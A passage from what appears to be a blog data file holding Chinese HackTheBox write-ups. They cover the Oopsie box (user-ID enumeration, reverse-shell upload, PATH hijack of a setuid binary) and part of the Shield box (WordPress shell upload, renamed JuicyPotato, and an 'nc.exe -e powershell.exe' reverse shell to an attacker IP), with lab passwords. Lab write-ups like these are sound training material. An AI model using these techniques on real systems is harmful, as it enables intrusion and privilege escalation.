\n```\n\n![](https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png)\n\n![](https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png)\n\n拥有者有`s`（`setuid`）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的`ID`值输出以该数字为编号的`bug`报告\n\n![](https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png)\n\n接下来我们可以使用`strings`命令来看看对象文件或二进制文件中查找可打印的字符串\n\n![](https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png)\n\n可以看到`bugtracker`调用了`cat`命令，输出了`/root/reports/`目录下的`bug`报告，其实本来我们当前用户是没有权限访问`/root`目录的，但是我们有了`setuid`后就拥有了`/root`目录的访问有权限，也就拥有了`root`权限，当前用户执行`bugtracker`程序是会优先使用当前的`path`变量，这时候我们就可以在当前用户环境变量`指定的路径`中搜索`cat`命令，然后创建一个恶意的`cat`命令，修改当前用户环境变量，完成提权操作\n\n```\nexport PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho '/bin/sh' > cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n```\n\n![](https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png)\n\n这样`bugtracker`再次调用`cat`命令时实际上调用的是`/tmp`目录下的恶意的`cat`命令，我们运行一下`bugtracker`可以看出，此时`robert`用户临时具有了`root`权限，执行`id`命令发现只是`robert`用户的`uid`变为了`root`，不是真正的`root`用户\n\n![](https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png)\n\n这样我们就可以获取system的flag了\n\n![](https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png)\n\n在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码\n\n![](https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png)\n\n> 参考：\n>\n> 1、https://www.echocipher.life/index.php/archives/872/\n>\n> 2、[关于Linux下s、t、i、a权限](https://www.cnblogs.com/qlqwjy/p/8665871.html)\n>\n> 3、[LINUX s权限位提权](http://www.361way.com/suid-privilege/5965.html)\n\n","source":"_posts/HackTheBox-Oopsie.md","raw":"---\ntitle: HackTheBox-Oopsie\ndate: 2021-08-2 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sT -Pn 10.10.10.28\n```\n\n![](https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png)\n\n发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面\n\n![](https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png)\n\n**目录扫描：**\n\n成功找到登录界面\n\n![](https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png)\n\n在bp中也可以看到登录页的js加载记录\n\n![](https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png)\n\n在浏览器打开\n\n![](https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png)\n\n## 实验过程\n\n账号为`admin`，密码是上一题中出现过的`MEGACORP_4dm1n!!`，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限\n\n![](https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png)\n\n先看一下我们现在账号信息，在url中还可以看到目前的用户id=1\n\n![](https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png)\n\n**再抓包看一下**：\n\nid和user、role对应，可以尝试遍历用户\n\n![](https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png)\n\n**发送到interlude模块**，标记id参数，设置好payload开始爆破\n\n![](https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png)\n\n![](https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png)\n\n看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户\n\n![](https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png)\n\n![](https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png)\n\n修改目前用户的user和role值，成功越权到super admin用户\n\n![](https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png)\n\n![](https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png)\n\n然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传\n\n![](https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png)\n\n直接用kali自带的反弹shell文件，修改好ip和port\n\n![](https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png)\n\n注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传\n\n![](https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png)\n\n![](https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png)\n\n接下来开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png)\n\n然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里\n\n**访问上传的shell来执行**\n\n![](https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png)\n\n回到netcat中就可以看到反弹的shell了\n\n![](https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png)\n\n拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码\n\n![](https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png)\n\n但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：\n\n```\n交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n```\n\n```\n用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n```\n\n逐条键入命令：\n\n\n```\n# 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n```\n\n拿到交互的shell我们就可以切换到Robert用户了\n\n![](https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png)\n\n**获取普通用户权限的flag**\n\n![](https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png)\n\n## 权限提升\n\n下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限\n\n```\n# -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2>/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2>/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n```\n\n![](https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png)\n\n![](https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png)\n\n拥有者有`s`（`setuid`）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的`ID`值输出以该数字为编号的`bug`报告\n\n![](https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png)\n\n接下来我们可以使用`strings`命令来看看对象文件或二进制文件中查找可打印的字符串\n\n![](https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png)\n\n可以看到`bugtracker`调用了`cat`命令，输出了`/root/reports/`目录下的`bug`报告，其实本来我们当前用户是没有权限访问`/root`目录的，但是我们有了`setuid`后就拥有了`/root`目录的访问有权限，也就拥有了`root`权限，当前用户执行`bugtracker`程序是会优先使用当前的`path`变量，这时候我们就可以在当前用户环境变量`指定的路径`中搜索`cat`命令，然后创建一个恶意的`cat`命令，修改当前用户环境变量，完成提权操作\n\n```\nexport PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho '/bin/sh' > cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n```\n\n![](https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png)\n\n这样`bugtracker`再次调用`cat`命令时实际上调用的是`/tmp`目录下的恶意的`cat`命令，我们运行一下`bugtracker`可以看出，此时`robert`用户临时具有了`root`权限，执行`id`命令发现只是`robert`用户的`uid`变为了`root`，不是真正的`root`用户\n\n![](https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png)\n\n这样我们就可以获取system的flag了\n\n![](https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png)\n\n在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码\n\n![](https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png)\n\n> 参考：\n>\n> 1、https://www.echocipher.life/index.php/archives/872/\n>\n> 2、[关于Linux下s、t、i、a权限](https://www.cnblogs.com/qlqwjy/p/8665871.html)\n>\n> 3、[LINUX s权限位提权](http://www.361way.com/suid-privilege/5965.html)\n\n","slug":"HackTheBox-Oopsie","published":1,"updated":"2021-09-29T09:23:00.243Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckupad5tp0002wsvtgs9q4vb6","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sT -Pn 10.10.10.28\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png\"></p>\n<p>发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png\"></p>\n<p><strong>目录扫描：</strong></p>\n<p>成功找到登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png\"></p>\n<p>在bp中也可以看到登录页的js加载记录</p>\n<p><img src=\"https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png\"></p>\n<p>在浏览器打开</p>\n<p><img src=\"https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>账号为<code>admin</code>，密码是上一题中出现过的<code>MEGACORP_4dm1n!!</code>，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限</p>\n<p><img src=\"https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png\"></p>\n<p>先看一下我们现在账号信息，在url中还可以看到目前的用户id=1</p>\n<p><img src=\"https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png\"></p>\n<p><strong>再抓包看一下</strong>：</p>\n<p>id和user、role对应，可以尝试遍历用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png\"></p>\n<p><strong>发送到interlude模块</strong>，标记id参数，设置好payload开始爆破</p>\n<p><img src=\"https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png\"></p>\n<p>看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png\"></p>\n<p>修改目前用户的user和role值，成功越权到super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png\"></p>\n<p>然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png\"></p>\n<p>直接用kali自带的反弹shell文件，修改好ip和port</p>\n<p><img src=\"https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png\"></p>\n<p>注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png\"></p>\n<p>接下来开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png\"></p>\n<p>然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里</p>\n<p><strong>访问上传的shell来执行</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png\"></p>\n<p>回到netcat中就可以看到反弹的shell了</p>\n<p><img src=\"https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png\"></p>\n<p>拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png\"></p>\n<p>但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：</p>\n<pre><code>交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n</code></pre>\n<pre><code>用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n</code></pre>\n<p>逐条键入命令：</p>\n<pre><code># 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n</code></pre>\n<p>拿到交互的shell我们就可以切换到Robert用户了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png\"></p>\n<p><strong>获取普通用户权限的flag</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限</p>\n<pre><code># -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2&gt;/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2&gt;/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png\"></p>\n<p>拥有者有<code>s</code>（<code>setuid</code>）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的<code>ID</code>值输出以该数字为编号的<code>bug</code>报告</p>\n<p><img src=\"https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png\"></p>\n<p>接下来我们可以使用<code>strings</code>命令来看看对象文件或二进制文件中查找可打印的字符串</p>\n<p><img src=\"https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png\"></p>\n<p>可以看到<code>bugtracker</code>调用了<code>cat</code>命令，输出了<code>/root/reports/</code>目录下的<code>bug</code>报告，其实本来我们当前用户是没有权限访问<code>/root</code>目录的，但是我们有了<code>setuid</code>后就拥有了<code>/root</code>目录的访问有权限，也就拥有了<code>root</code>权限，当前用户执行<code>bugtracker</code>程序是会优先使用当前的<code>path</code>变量，这时候我们就可以在当前用户环境变量<code>指定的路径</code>中搜索<code>cat</code>命令，然后创建一个恶意的<code>cat</code>命令，修改当前用户环境变量，完成提权操作</p>\n<pre><code>export PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho &#39;/bin/sh&#39; &gt; cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png\"></p>\n<p>这样<code>bugtracker</code>再次调用<code>cat</code>命令时实际上调用的是<code>/tmp</code>目录下的恶意的<code>cat</code>命令，我们运行一下<code>bugtracker</code>可以看出，此时<code>robert</code>用户临时具有了<code>root</code>权限，执行<code>id</code>命令发现只是<code>robert</code>用户的<code>uid</code>变为了<code>root</code>，不是真正的<code>root</code>用户</p>\n<p><img src=\"https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png\"></p>\n<p>这样我们就可以获取system的flag了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png\"></p>\n<p>在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p>1、<a href=\"https://www.echocipher.life/index.php/archives/872/\">https://www.echocipher.life/index.php/archives/872/</a></p>\n<p>2、<a href=\"https://www.cnblogs.com/qlqwjy/p/8665871.html\">关于Linux下s、t、i、a权限</a></p>\n<p>3、<a href=\"http://www.361way.com/suid-privilege/5965.html\">LINUX s权限位提权</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sT -Pn 10.10.10.28\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png\"></p>\n<p>发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png\"></p>\n<p><strong>目录扫描：</strong></p>\n<p>成功找到登录界面</p>\n<p><img src=\"https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png\"></p>\n<p>在bp中也可以看到登录页的js加载记录</p>\n<p><img src=\"https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png\"></p>\n<p>在浏览器打开</p>\n<p><img src=\"https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>账号为<code>admin</code>，密码是上一题中出现过的<code>MEGACORP_4dm1n!!</code>，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限</p>\n<p><img src=\"https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png\"></p>\n<p>先看一下我们现在账号信息，在url中还可以看到目前的用户id=1</p>\n<p><img src=\"https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png\"></p>\n<p><strong>再抓包看一下</strong>：</p>\n<p>id和user、role对应，可以尝试遍历用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png\"></p>\n<p><strong>发送到interlude模块</strong>，标记id参数，设置好payload开始爆破</p>\n<p><img src=\"https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png\"></p>\n<p>看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png\"></p>\n<p>修改目前用户的user和role值，成功越权到super admin用户</p>\n<p><img src=\"https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png\"></p>\n<p>然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png\"></p>\n<p>直接用kali自带的反弹shell文件，修改好ip和port</p>\n<p><img src=\"https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png\"></p>\n<p>注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传</p>\n<p><img src=\"https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png\"></p>\n<p>接下来开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png\"></p>\n<p>然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里</p>\n<p><strong>访问上传的shell来执行</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png\"></p>\n<p>回到netcat中就可以看到反弹的shell了</p>\n<p><img src=\"https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png\"></p>\n<p>拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png\"></p>\n<p>但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：</p>\n<pre><code>交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n</code></pre>\n<pre><code>用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n</code></pre>\n<p>逐条键入命令：</p>\n<pre><code># 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n</code></pre>\n<p>拿到交互的shell我们就可以切换到Robert用户了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png\"></p>\n<p><strong>获取普通用户权限的flag</strong></p>\n<p><img src=\"https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限</p>\n<pre><code># -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2&gt;/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2&gt;/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png\"></p>\n<p><img src=\"https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png\"></p>\n<p>拥有者有<code>s</code>（<code>setuid</code>）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的<code>ID</code>值输出以该数字为编号的<code>bug</code>报告</p>\n<p><img src=\"https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png\"></p>\n<p>接下来我们可以使用<code>strings</code>命令来看看对象文件或二进制文件中查找可打印的字符串</p>\n<p><img src=\"https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png\"></p>\n<p>可以看到<code>bugtracker</code>调用了<code>cat</code>命令，输出了<code>/root/reports/</code>目录下的<code>bug</code>报告，其实本来我们当前用户是没有权限访问<code>/root</code>目录的，但是我们有了<code>setuid</code>后就拥有了<code>/root</code>目录的访问有权限，也就拥有了<code>root</code>权限，当前用户执行<code>bugtracker</code>程序是会优先使用当前的<code>path</code>变量，这时候我们就可以在当前用户环境变量<code>指定的路径</code>中搜索<code>cat</code>命令，然后创建一个恶意的<code>cat</code>命令，修改当前用户环境变量，完成提权操作</p>\n<pre><code>export PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho &#39;/bin/sh&#39; &gt; cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png\"></p>\n<p>这样<code>bugtracker</code>再次调用<code>cat</code>命令时实际上调用的是<code>/tmp</code>目录下的恶意的<code>cat</code>命令，我们运行一下<code>bugtracker</code>可以看出，此时<code>robert</code>用户临时具有了<code>root</code>权限，执行<code>id</code>命令发现只是<code>robert</code>用户的<code>uid</code>变为了<code>root</code>，不是真正的<code>root</code>用户</p>\n<p><img src=\"https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png\"></p>\n<p>这样我们就可以获取system的flag了</p>\n<p><img src=\"https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png\"></p>\n<p>在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码</p>\n<p><img src=\"https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p>1、<a href=\"https://www.echocipher.life/index.php/archives/872/\">https://www.echocipher.life/index.php/archives/872/</a></p>\n<p>2、<a href=\"https://www.cnblogs.com/qlqwjy/p/8665871.html\">关于Linux下s、t、i、a权限</a></p>\n<p>3、<a href=\"http://www.361way.com/suid-privilege/5965.html\">LINUX s权限位提权</a></p>\n</blockquote>\n"},{"title":"HackTheBox-Shield","date":"2021-08-18T09:05:21.000Z","_content":"\n## 实验环境\n\n![](https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png)\n\n## 信息收集\n\n**端口扫描**：\n\n```\nnamp -A -T4 10.10.10.29\n```\n\n发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows\n\n![](https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png)\n\n`--script vuln`参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址\n\n![](https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png)\n\n**目录扫描**，也发现wordpress目录\n\n![](https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png)\n\n**Wpscan分析**，可以看到wordpress的版本\n\n```\nwpscan --url http://10.10.10.29/wordpress\n```\n\n![](https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png)\n\n## 实验过程\n\n用上一台靶机的账号密码可以登录后台`admin`:`P@s5w0rd!`\n\n![](https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png)\n\n知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块\n\n![](https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png)\n\n设置参数\n\n![](https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png)\n\n执行exploit命令后，获得shell\n\n![](https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png)\n\n在shell中执行命令\n\n![](https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png)\n\n查看wp-config.php，发现敏感信息\n\n![](https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png)\n\n**反弹shell**：\n\n在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口\n\n![](https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png)\n\n在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell\n\n![](https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png)\n\n![](https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png)\n\n查看当前用户\n\n![](https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png)\n\n**提权:**\n\n使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到\n\n将js.exe上传到对方机器\n\n![](https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png)\n\n在windows shell中生成一个bat脚本：\n\n```\necho START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 > shell.bat\n```\n\n![](https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png)\n\n在本机使用nc创建一个监听端口，用来接收提权后的windows shell\n\n![](https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png)\n\n运行juicy-potato提权：\n\n```\njs.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n```\n\n![](https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png)\n\n获得system权限的windows 